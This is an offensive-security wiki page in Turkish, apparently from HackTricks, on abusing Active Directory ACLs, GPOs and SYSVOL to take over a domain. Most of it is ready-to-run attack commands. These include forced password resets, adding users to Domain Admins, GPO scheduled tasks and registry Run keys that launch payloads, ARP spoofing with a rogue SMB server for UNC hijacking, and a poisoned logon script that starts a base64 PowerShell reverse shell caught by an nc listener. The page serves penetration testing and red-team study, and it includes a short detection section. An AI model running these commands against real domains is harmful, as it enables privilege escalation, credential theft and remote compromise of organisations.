# Active Directory ACL/ACE'lerini Kötüye Kullanma

{{#include ../../../banners/hacktricks-training.md}}

**Bu sayfa çoğunlukla** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **adreslerindeki tekniklerin bir özetidir. Daha fazla ayrıntı için orijinal makalelere göz atın.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Kullanıcı Üzerinde GenericAll Hakları**

Bu ayrıcalık, saldırgana hedef kullanıcı hesabı üzerinde tam denetim sağlar. `GenericAll` hakları `Get-ObjectAcl` komutu kullanılarak doğrulandıktan sonra saldırgan şunları yapabilir:

- **Hedefin Parolasını Değiştirme**: `net user <username> <password> /domain` kullanılarak saldırgan kullanıcının parolasını sıfırlayabilir.
- Linux'tan aynı işlemi Samba `net rpc` ile SAMR üzerinden gerçekleştirebilirsiniz:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Hesap devre dışıysa UAC flag'ini kaldırın**: `GenericAll`, `userAccountControl` değerinin düzenlenmesine izin verir. Linux üzerinden BloodyAD, `ACCOUNTDISABLE` flag'ini kaldırabilir:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Kullanıcının hesabına bir SPN atayarak onu kerberoastable hale getirin, ardından ticket-granting ticket (TGT) hash'lerini çıkarmak ve kırmayı denemek için Rubeus ve targetedKerberoast.py kullanın.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Kullanıcı için ön kimlik doğrulamayı devre dışı bırakarak hesabını ASREPRoasting'e karşı savunmasız hâle getirin.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Bir kullanıcı üzerinde `GenericAll` yetkisine sahipseniz, sertifika tabanlı bir kimlik bilgisi ekleyebilir ve kullanıcının parolasını değiştirmeden onun kimliğiyle authenticate olabilirsiniz. Bkz.:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Grup Üzerinde GenericAll Yetkileri**

Bu yetki, saldırganın `Domain Admins` gibi bir grup üzerinde `GenericAll` yetkisine sahip olması durumunda grup üyeliklerini değiştirmesine olanak tanır. Saldırgan, grubun distinguished name bilgisini `Get-NetGroup` ile belirledikten sonra şunları yapabilir:

- **Kendilerini Domain Admins Grubuna Ekleme**: Bu işlem doğrudan komutlarla veya Active Directory ya da PowerSploit gibi modüller kullanılarak gerçekleştirilebilir.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux'tan, üzerlerinde GenericAll/Write üyelik yetkisine sahip olduğunuz rastgele gruplara kendinizi eklemek için BloodyAD'den de yararlanabilirsiniz. Hedef grup “Remote Management Users” grubunun içine nested edilmişse, bu gruba uyan host'larda hemen WinRM erişimi kazanırsınız:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Bu ayrıcalıklara bir computer object veya user account üzerinde sahip olmak şunları sağlar:

- **Kerberos Resource-based Constrained Delegation**: Bir computer object'in ele geçirilmesini sağlar.
- **Shadow Credentials**: Shadow credentials oluşturma ayrıcalıklarından yararlanarak bir computer veya user account'ını taklit etmek için bu technique kullanılabilir.

## **WriteProperty on Group**

Bir user belirli bir group'daki tüm objects üzerinde `WriteProperty` haklarına sahipse (ör. `Domain Admins`), şunları yapabilir:

- **Add Themselves to the Domain Admins Group**: `net user` ve `Add-NetGroupUser` komutlarının birlikte kullanılmasıyla gerçekleştirilebilen bu yöntem, domain içinde privilege escalation sağlar.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Group üzerinde Self (Self-Membership)**

Bu yetki, saldırganların grup üyeliğini doğrudan değiştiren komutlar aracılığıyla kendilerini `Domain Admins` gibi belirli gruplara eklemelerine olanak tanır. Aşağıdaki komut dizisi, kendini gruba eklemeyi sağlar:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Benzer bir ayrıcalık olan bu hak, saldırganların gruplar üzerinde `WriteProperty` hakkına sahip olmaları durumunda grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine olanak tanır. Bu ayrıcalığın doğrulanması ve kullanılması şu şekilde gerçekleştirilir:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Bir kullanıcı üzerinde `User-Force-Change-Password` için `ExtendedRight` yetkisine sahip olmak, mevcut parolayı bilmeden parola sıfırlamaya olanak tanır. Bu yetkinin doğrulanması ve istismar edilmesi PowerShell veya alternatif komut satırı araçları aracılığıyla gerçekleştirilebilir. Etkileşimli oturumlar ve etkileşimsiz ortamlar için one-liner'lar dahil olmak üzere, kullanıcının parolasını sıfırlamak için çeşitli yöntemler sunulur. Komutlar, basit PowerShell çağrılarından Linux üzerinde `rpcclient` kullanımına kadar uzanarak saldırı vektörlerinin çok yönlülüğünü gösterir.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Group Üzerinde WriteOwner**

Bir attacker, bir group üzerinde `WriteOwner` haklarına sahip olduğunu tespit ederse group sahipliğini kendi üzerine değiştirebilir. Bu durum, söz konusu group `Domain Admins` olduğunda özellikle etkilidir; çünkü sahipliğin değiştirilmesi, group attributes ve membership üzerinde daha geniş kontrol sağlar. Süreç, `Get-ObjectAcl` kullanılarak doğru object'in belirlenmesini ve ardından owner'ın SID veya name kullanılarak değiştirilmesi için `Set-DomainObjectOwner` kullanılmasını içerir.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **Kullanıcı üzerinde GenericWrite**

Bu izin, saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle `GenericWrite` erişimiyle saldırgan, kullanıcı oturum açtığında kötü amaçlı bir script çalıştırmak için kullanıcının logon script path değerini değiştirebilir. Bu işlem, hedef kullanıcının `scriptpath` özelliğini saldırganın script'ine işaret edecek şekilde güncellemek için `Set-ADObject` komutu kullanılarak gerçekleştirilir.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Bu ayrıcalıkla saldırganlar, kendilerini veya diğer kullanıcıları belirli gruplara eklemek gibi grup üyeliğini değiştirebilir. Bu işlem; bir credential object oluşturmayı, bunu kullanarak bir gruba kullanıcı eklemeyi veya gruptan kullanıcı çıkarmayı ve PowerShell komutlarıyla üyelik değişikliklerini doğrulamayı içerir.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux'tan, grup üzerinde `GenericWrite` yetkiniz olduğunda Samba `net` üyeleri ekleyebilir/kaldırabilir (PowerShell/RSAT kullanılamadığında kullanışlıdır):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Bir AD object'inin sahibi olmak ve üzerinde `WriteDACL` privileges'ına sahip olmak, bir saldırganın object üzerinde kendisine `GenericAll` privileges vermesini sağlar. Bu işlem, ADSI manipulation aracılığıyla gerçekleştirilir; böylece object üzerinde tam kontrol elde edilir ve group memberships değiştirilir. Buna rağmen, Active Directory module'ünün `Set-Acl` / `Get-Acl` cmdlet'lerini kullanarak bu privileges'ları exploit etmeye çalışırken bazı sınırlamalar vardır.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner hızlı ele geçirme (PowerView)

Bir kullanıcı veya service account üzerinde `WriteOwner` ve `WriteDacl` izinlerine sahip olduğunuzda, eski parolayı bilmeden PowerView kullanarak tam kontrol elde edebilir ve parolasını sıfırlayabilirsiniz:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notlar:
- Yalnızca `WriteOwner` yetkiniz varsa, önce sahibi kendiniz olarak değiştirmeniz gerekebilir:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Parola sıfırlama sonrasında herhangi bir protokolle (SMB/LDAP/RDP/WinRM) erişimi doğrulayın.

## **Domain Üzerinde Replication (DCSync)**

DCSync saldırısı, bir Domain Controller'ı taklit etmek ve kullanıcı kimlik bilgileri de dahil olmak üzere verileri senkronize etmek için domain üzerindeki belirli replication izinlerinden yararlanır. Bu güçlü teknik, saldırganların bir Domain Controller'a doğrudan erişmeden AD ortamından hassas bilgileri çıkarmasına olanak tanıyan `DS-Replication-Get-Changes` gibi izinleri gerektirir.<sup>[[5]](#references)</sup> [**DCSync attack hakkında daha fazla bilgi edinin.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) yönetimi için devredilen erişim, önemli güvenlik riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları devredilmişse **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilir. PowerView kullanılarak belirlenen bu izinler kötü amaçlarla kötüye kullanılabilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO Permissions Enumerate Etme

Yanlış yapılandırılmış GPOs'ları belirlemek için PowerSploit'in cmdlet'leri birbirine zincirlenebilir. Bu, belirli bir kullanıcının yönetme izinlerine sahip olduğu GPOs'ların keşfedilmesini sağlar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Belirli Bir Policy'nin Uygulandığı Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığını çözümlemek mümkündür; bu, olası etkinin kapsamını anlamaya yardımcı olur. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Belirli Bir Bilgisayara Uygulanan Policy'ler**: Belirli bir bilgisayara hangi policy'lerin uygulandığını görmek için `Get-DomainGPO` gibi komutlardan yararlanılabilir.

**Belirli Bir Policy'nin Uygulandığı OU'lar**: Belirli bir policy'den etkilenen organizational unit'leri (OU'lar) belirlemek için `Get-DomainOU` kullanılabilir.

GPOs'ları enumerate etmek ve içlerindeki sorunları bulmak için [**GPOHound**](https://github.com/cogiceo/GPOHound) aracını da kullanabilirsiniz.

### Abuse GPO - New-GPOImmediateTask

Yanlış yapılandırılmış GPOs'lar, örneğin immediate scheduled task oluşturarak code çalıştırmak için exploit edilebilir. Bu işlem, etkilenen makinelerde bir kullanıcıyı local administrators grubuna eklemek ve ayrıcalıkları önemli ölçüde yükseltmek için kullanılabilir:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module'ü yüklüyse yeni GPO'lar oluşturulup bağlanmasına ve etkilenen bilgisayarlarda backdoor çalıştırmak için registry değerleri gibi tercihlerin ayarlanmasına olanak tanır. Bu yöntem, GPO'nun güncellenmesini ve çalıştırma işlemi için bir kullanıcının bilgisayarda oturum açmasını gerektirir:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse, yeni GPO'lar oluşturma gereksinimi olmadan görevler ekleyerek veya ayarları değiştirerek mevcut GPO'ları abuse etmek için bir yöntem sunar. Bu araç, değişiklikleri uygulamadan önce mevcut GPO'ların değiştirilmesini veya yeni GPO'lar oluşturmak için RSAT araçlarının kullanılmasını gerektirir:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Policy Update'ini Zorlama

GPO güncellemeleri genellikle yaklaşık 90 dakikada bir gerçekleşir. Bu süreci, özellikle bir değişiklik uygulandıktan sonra hızlandırmak için hedef bilgisayarda `gpupdate /force` komutu kullanılabilir ve böylece anında policy update zorlanabilir. Bu komut, GPO'larda yapılan değişikliklerin bir sonraki otomatik güncelleme döngüsünün beklenmesine gerek kalmadan uygulanmasını sağlar.

### Under the Hood

`Misconfigured Policy` gibi belirli bir GPO için Scheduled Tasks incelendiğinde, `evilTask` gibi görevlerin eklendiği doğrulanabilir. Bu görevler, sistem davranışını değiştirmeyi veya yetkileri yükseltmeyi amaçlayan script'ler ya da command-line araçları aracılığıyla oluşturulur.

`New-GPOImmediateTask` tarafından oluşturulan XML configuration file'da gösterilen görev yapısı, çalıştırılacak command ve tetikleyicileri dahil olmak üzere scheduled task'ın ayrıntılarını belirtir. Bu dosya, scheduled task'ların GPO'lar içinde nasıl tanımlandığını ve yönetildiğini gösterir ve policy enforcement'ın bir parçası olarak arbitrary command'lerin veya script'lerin çalıştırılması için bir yöntem sunar.

### Users and Groups

GPO'lar ayrıca hedef sistemlerdeki user ve group üyeliklerinin değiştirilmesine olanak tanır. Attackers, Users and Groups policy file'larını doğrudan düzenleyerek user'ları yerel `administrators` group'u gibi privileged group'lara ekleyebilir. Bu, GPO yönetim izinlerinin devredilmesiyle mümkündür; bu izinler, yeni user'lar eklemek veya group üyeliklerini değiştirmek için policy file'larının değiştirilmesine olanak tanır.

Users and Groups için XML configuration file, bu değişikliklerin nasıl uygulandığını gösterir. Bu dosyaya entries eklenerek belirli user'lara etkilenen sistemler genelinde elevated privileges verilebilir. Bu yöntem, GPO manipulation yoluyla privilege escalation için doğrudan bir yaklaşım sunar.

Bunun yanı sıra logon/logoff script'lerinden yararlanma, autorun'lar için registry key'lerini değiştirme, `.msi` file'ları aracılığıyla software yükleme veya service configuration'larını düzenleme gibi code execution ya da persistence sağlamak için ek yöntemler de değerlendirilebilir. Bu teknikler, GPO abuse yoluyla erişimi korumak ve hedef sistemleri kontrol etmek için çeşitli yollar sunar.

### GPC/GPT retrieval işlemini authenticated rogue service'lere yönlendirme

Bir GPO, metadata içeren bir LDAP **Group Policy Container (GPC)** ile policy file'larını barındıran SMB-hosted bir **Group Policy Template (GPT)** öğesinden oluşur. Refresh sırasında client, container'ın `gPLink` değerini izler, referans verilen GPC'yi ve `gPCFileSysPath` değerini okur, ardından GPT'yi bu UNC path üzerinden indirir. Sonuç olarak, GPC'nin kendisine veya bir OU, Site ya da Domain'in `gPLink` değerine write access, privileged policy processing'e dönüştürülebilir.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### `gPCFileSysPath` poisoning with GPOddity

Controlled principal hedef GPC'ye write access elde edebiliyorsa (doğrudan veya **NTLM relay to LDAP** aracılığıyla), `gPCFileSysPath` değerini attacker tarafından barındırılan bir UNC path ile değiştirin. [GPOddity](https://github.com/synacktiv/GPOddity), LDAP değişikliğini otomatikleştirir ve Group Policy client'ın `NT AUTHORITY\SYSTEM` olarak çalıştırdığı module-based policy file'larını veya bir Immediate Task'ı içeren malicious bir GPT sunar.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Anonymous veya credentials'tan bağımsız bir SMB share, güncel Windows client'larında yeterli değildir: SMB Secure Negotiate, authentication'ın başarılı olduğuna dair kanıt gerektirir; bu nedenle rogue service, domain identity'yi doğrulamalı, SMB session key'i türetmeli ve response'larını doğru şekilde imzalamalıdır. Embedded mode'da GPOddity'yi controlled machine account ve bu account'ın service key'i ile yapılandırın, ardından `[COMMANDS]` section'ında computer-side veya user-side payload seçin.<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**Kullanıcı GPO uç durumu:** MS16-072 sonrasında Windows, **aynı TCP bağlantısı** içinde hâlâ iki SMB2 oturumu oluşturur: kullanıcı oturumu `GPT.INI` dosyasını okur, ardından bilgisayar hesabı oturumu `ScheduledTasks.xml` gibi etkin yapılandırmayı okur. Bu nedenle sahte bir sunucu, kimlik doğrulama durumunu, oturum anahtarlarını ve imzalama anahtarlarını yalnızca sokete göre değil, SMB2 `SessionId` değerine göre indekslemelidir. GPOddity/OUned içine gömülü Scapy fork'u bunu `SMBStreamSocketMultiplexing` ve çoklama destekli `SMBServer` üzerinden uygular; tek oturumlu Impacket/Scapy sunucuları ise aksi hâlde yanlış imzalama durumunu yeniden kullanır ve kullanıcı ilkelerinde başarısız olur.<sup>[[15]](#references)</sup>

#### OUned ile `gPLink` poisoning

Bir OU, Site veya Domain üzerinde `WriteGPLink`, `GenericWrite` ya da eşdeğer denetime sahip olan bir saldırgan, GPC DN'si saldırganın kontrolündeki bir LDAP host'u tarafından sunulan bir bağlantı ekleyebilir. Bu teknik ilk olarak Petros Koutroumpis tarafından sunulmuştur; [OUned](https://github.com/synacktiv/OUned), LDAP yazma işlemini ve kötü amaçlı GPC/GPT zincirini otomatikleştirir.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
Kurban önce sahte LDAP service'e authenticate olur ve `gPCFileSysPath` değeri sahte SMB service'i gösteren bir GPC alır; ardından SMB'ye authenticate olur ve sağlanan GPT'yi uygular. Bu nedenle OUned'in LDAP SPN'ine sahip bir hesaba, SMB için HOST SPN'ine sahip bir machine account'a (aynı machine account her ikisini de karşılayabilir) ve 389 ile 445 portlarını operator host'a yönlendiren DNS çözümlemesine veya reverse forwarding'e ihtiyacı vardır.<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
OUned'ın gömülü Scapy LDAP server'ı, Kerberos/SPNEGO'yu gerçek kontrollü service key ile doğrular ve JSON'dan rastgele GPC verileri sunar. Boş JSON anahtarı rootDSE'yi modeller, `base64:` önekleri binary değerleri temsil eder ve server; add/delete/modify/search işlemlerinin yanı sıra `BASE`, `LEVEL` ve `SUBTREE` search'lerini destekler. Ayrıca korumasızlık, integrity veya confidentiality arasında negotiation yapabilir. Bu, başka bir Windows bileşeni attacker-controlled bir LDAP reference'ını takip ettiğinde ancak authenticated LDAP konusunda ısrar ettiğinde service'i yeniden kullanılabilir hâle getirir.<sup>[[15]](#references)</sup>

Bir account password'ını dummy domain'e senkronize etmenin her Kerberos key'ini yeniden oluşturduğunu varsaymayın: RC4 password'dan türetilirken AES string-to-key işlemi, principal'ın hostname/domain'inden türetilen bir salt da kullanır. Gerçek account AES key'ini `KerberosSSP`'ye vermek, machine account'ın kendisinin yazabildiği `msDS-SupportedEncryptionTypes` üzerinde tespit edilebilir bir değişiklik yaparak RC4'ü zorlamayı önler.<sup>[[15]](#references)</sup>

#### Detection pivots

`gPCFileSysPath` veya `gPLink` değişikliklerini GPO version değişiklikleri ve yeni Immediate/Scheduled Task XML'leriyle ilişkilendirin. Beklenmeyen naming context'lere giden link'leri, onaylanan DC/SYSVOL kümesinin dışındaki UNC host'larını, machine-account adlarını yönlendiren DNS kayıtlarını, alışılmadık machine account'lar için LDAP/CIFS service ticket'larını ve RC4'ü etkinleştiren `msDS-SupportedEncryptionTypes` değişikliklerini araştırın.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

Bir OU/domain üzerinde `WriteGPLink`, hedef container'ın `gPLink` attribute'unu değiştirmenize ve GPO'nun kendisini düzenlemeden **mevcut bir GPO'nun uygulanmasını zorlamanıza** olanak tanır. Bu, linked GPO zaten **UNC paths** (`\\HOST\share\...`) üzerinden remote content'a reference verdiğinde ilgi çekici hâle gelir; çünkü authenticated users **SYSVOL**'u okuyabilir ve yeniden kullanılabilir policy'leri offline olarak arayabilir.<sup>[[11]](#references)</sup>

Üst düzey iş akışı:

1. BloodHound kullanarak bir OU üzerinde `WriteGPLink` sahibi bir principal belirleyin ve bu OU içindeki computer/user'ları enumerate edin.
2. `SYSVOL`'u read-only olarak clone edin ve UNC paths'e reference veren **Software Installation**, **drive mappings** (`Drives.xml`) ve **logon/startup scripts** aramak için GPO'ları parse edin.
3. DFS/domain-namespace paths yerine **doğrudan hostname**'e işaret eden policy'leri (örneğin `\\DC02\share\pkg.msi`) tercih edin; çünkü hostname tabanlı path'leri L2 spoofing ile yönlendirmek daha kolaydır.
4. Victim'ın mevcut policy'yi işlemesini sağlamak için seçilen GPO GUID'sini hedef OU'nun `gPLink`'ine ekleyin.
5. Aynı broadcast domain üzerinde UNC host'una ARP spoofing uygulayın ve IP'sini yerel olarak bind edin (`ip addr add <target_ip>/32 dev <iface>`); böylece victim'ın SMB trafiği host'unuza ulaşır.
6. Beklenen path/filename'i bir attacker SMB server'ından (örneğin `smbserver.py`) sunun ve normal policy processing'i bekleyin.

Örnek `SYSVOL` toplama ve GPO ilişkilendirmesi:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Mevcut GPO'yu hedef OU'ya bağlayın:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Bağlantılı GPO, bir MSI dosyasını UNC path üzerinden dağıtıyorsa istemci bunu **computer startup** sırasında alır ve **`NT AUTHORITY\SYSTEM`** olarak kurar. Referans verilen host'u spoof edip aynı share/path/name altında malicious bir MSI sunarak **SYSVOL'u değiştirmeden** `WriteGPLink` işlemini SYSTEM code execution'a dönüştürebilirsiniz.

Önemli kısıtlamalar:

- **Timing matters**: Yeni link policy refresh sırasında (genellikle ~90 dakika) görülür; ancak **Software Installation** genellikle **reboot** sırasında tetiklenir.
- Windows Installer dağıtımı genellikle package **`ProductCode`** üzerinden takip eder. Ürün zaten kuruluysa dağıtım atlanabilir.
- Installer rejection'ı önlemek için rogue MSI'ı, **`ProductCode`** ve **`PackageCode`** değerleri GPO'nun beklediği legitimate package ile eşleşecek şekilde patch'leyin.
- Eski `.aas` advertisement dosyaları `SYSVOL` içinde kalabilir; bu nedenle ona güvenmeden önce deployment'ın hâlâ active göründüğünü doğrulayın.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` içindeki GPP drive mapping'leri, kullanıcıların logon veya yeniden bağlantı sırasında yapılandırılmış UNC path'e authenticate olmasına neden olur. Referans verilen host'u spoof ederseniz **NetNTLMv2** yakalayabilirsiniz. SMB'nin kasıtlı olarak başarısız olması sağlanırsa Windows **WebDAV** üzerinden yeniden deneme yapabilir ve **LDAP(S)**, **AD CS** veya **SMB**'ye relay için çok daha esnek olan **HTTP üzerinden NTLM** gönderebilir.

#### Logon/startup script UNC hijack

Aynı yöntem `SYSVOL` içinde bulunan UNC-hosted script'ler için de geçerlidir:

- **Logon script'leri** genellikle **user** context'inde çalışır.
- **Startup script'leri** genellikle **computer / SYSTEM** context'inde çalışır.

Script path'i spoof edilebilir bir hostname'e işaret ediyorsa UNC host'unu yönlendirin ve beklenen konumdan replacement script içeriği sunun.

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` veya `\\<dc>\NETLOGON\` altındaki writable path'ler, GPO aracılığıyla user logon sırasında çalıştırılan logon script'lerinin değiştirilmesine olanak tanır. Bu, logon olan kullanıcıların security context'inde code execution sağlar.

### Logon script'lerini bulma
- Yapılandırılmış bir logon script'i için user attribute'larını inceleyin:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Betiklere yönelik kısayolları veya referansları ortaya çıkarmak için domain paylaşımlarını tarayın:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- SYSVOL/NETLOGON'a işaret eden hedefleri çözümlemek için `.lnk` dosyalarını ayrıştırın (yararlı bir DFIR hilesi ve doğrudan GPO erişimi olmayan saldırganlar için):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound, mevcut olduğunda kullanıcı düğümlerinde `logonScript` (scriptPath) özniteliğini görüntüler.

### Yazma erişimini doğrulayın (paylaşım listelerine güvenmeyin)
Automated tooling, SYSVOL/NETLOGON'u salt okunur olarak gösterebilir; ancak temel NTFS ACL'leri yine de yazma iznine izin verebilir. Her zaman test edin:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Dosya boyutu veya mtime değişiyorsa write erişiminiz vardır. Değişiklik yapmadan önce orijinalleri koruyun.

### RCE için bir VBScript logon script'ini zehirleyin
Bir PowerShell reverse shell başlatan bir komut ekleyin (revshells.com üzerinden oluşturun) ve business function'ın bozulmasını önlemek için orijinal mantığı koruyun:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Host'unuzda dinleme yapın ve bir sonraki etkileşimli oturum açmayı bekleyin:
```bash
rlwrap -cAr nc -lnvp 443
```
Notlar:
